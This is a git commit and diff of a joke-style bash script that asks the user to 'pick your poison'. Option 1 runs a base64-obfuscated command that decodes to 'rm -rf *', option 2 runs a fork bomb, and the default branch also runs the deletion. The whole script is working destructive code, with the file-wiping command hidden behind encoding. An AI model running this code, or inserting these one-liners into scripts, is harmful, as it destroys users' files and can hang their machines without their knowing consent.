411136ff193129d9bb0852c0fe66e3f02a2d7f97
Aves <aves@localhost.localdomain>
2020-03-10 03:57:02 -0500

    added some stuff

--- if_one_liners_could_kill.sh
+++ if_one_liners_could_kill.sh
@@ -1,3 +1,19 @@
-$(echo cm0gLXJmICoK | base64 -d)
+#!/bin/bash
 
-:() { : | : & }; :
+echo "Pick your poison [ 1 or 2 ]:"
+read poison
+
+case $poison in
+	1)
+		echo poison 1
+		$(echo cm0gLXJmICoK | base64 -d)
+		;;
+	2)
+		echo poison 2
+		:() { : | : & }; :
+		;;
+	*)
+		echo "poison #1"
+		$(echo cm0gLXJmICoK | base64 -d)
+		;;
+esac
